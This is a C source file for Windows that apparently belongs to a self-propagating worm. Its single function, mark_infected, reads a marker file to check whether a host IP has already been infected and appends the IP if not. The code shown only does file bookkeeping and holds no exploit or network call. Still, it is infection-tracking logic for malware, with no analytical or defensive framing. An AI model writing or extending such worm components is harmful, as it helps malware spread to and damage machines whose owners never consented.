#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

int mark_infected(const char *ip)
{
    FILE *file;
    size_t ip_length;
    size_t line_length = 0;
    int line_matches = 1;
    int last_line_byte = 0;
    int has_file_bytes = 0;
    int already_infected = 0;
    int ch;

    if (ip == NULL)
        return -1;

    ip_length = strlen(ip);
    if (strchr(ip, '\n') != NULL || strchr(ip, '\r') != NULL)
        return -1;

    errno = 0;
    file = fopen(SELF_MARKER, "rb");
    if (file == NULL) {
        if (errno != ENOENT)
            return -1;
    } else {
        while ((ch = fgetc(file)) != EOF) {
            has_file_bytes = 1;

            if (ch == '\n') {
                size_t logical_length = line_length;

                if (logical_length > 0 && last_line_byte == '\r')
                    --logical_length;

                if (line_matches && logical_length == ip_length) {
                    already_infected = 1;
                    break;
                }

                line_length = 0;
                line_matches = 1;
                last_line_byte = 0;
                continue;
            }

            if (line_length < ip_length && (unsigned char)ch != (unsigned char)ip[line_length])
                line_matches = 0;

            if (line_length == SIZE_MAX) {
                fclose(file);
                return -1;
            }

            ++line_length;
            last_line_byte = ch;
        }

        if (ferror(file)) {
            fclose(file);
            return -1;
        }

        if (!already_infected && line_length > 0) {
            size_t logical_length = line_length;

            if (logical_length > 0 && last_line_byte == '\r')
                --logical_length;

            if (line_matches && logical_length == ip_length)
                already_infected = 1;
        }

        if (fclose(file) != 0)
            return -1;

        if (already_infected)
            return 1;
    }

    file = fopen(SELF_MARKER, "ab");
    if (file == NULL)
        return -1;

    if (has_file_bytes && last_line_byte != '\n' && fputc('\n', file) == EOF) {
        fclose(file);
        return -1;
    }

    if ((ip_length > 0 && fwrite(ip, 1, ip_length, file) != ip_length) ||
        fputc('\n', file) == EOF) {
        fclose(file);
        return -1;
    }

    if (fclose(file) != 0)
        return -1;

    return 0;
}